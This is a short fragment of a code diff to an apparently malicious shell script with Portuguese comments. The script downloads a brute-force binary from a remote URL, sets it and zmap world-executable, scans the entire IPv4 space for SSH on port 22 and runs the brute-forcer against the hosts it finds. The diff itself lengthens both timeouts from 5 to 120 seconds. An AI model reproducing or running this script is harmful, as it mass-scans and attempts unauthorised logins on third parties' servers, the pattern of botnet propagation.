@@ -15,9 +15,9 @@ wget $brute_url  -O brute || curl  -L $brute_url -o brute
 
 chmod 777 brute && chmod 777 zmap
 
-timeout   5s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
+timeout   120s ./zmap  -p 22   0.0.0.0/0  > ips  #120 segundos para  pega os ips
 
-timeout   5s    ./brute  #120 segundos para  testa o   ip
+timeout   120s    ./brute  #120  segundos para  testa o   ip
 
 return
 
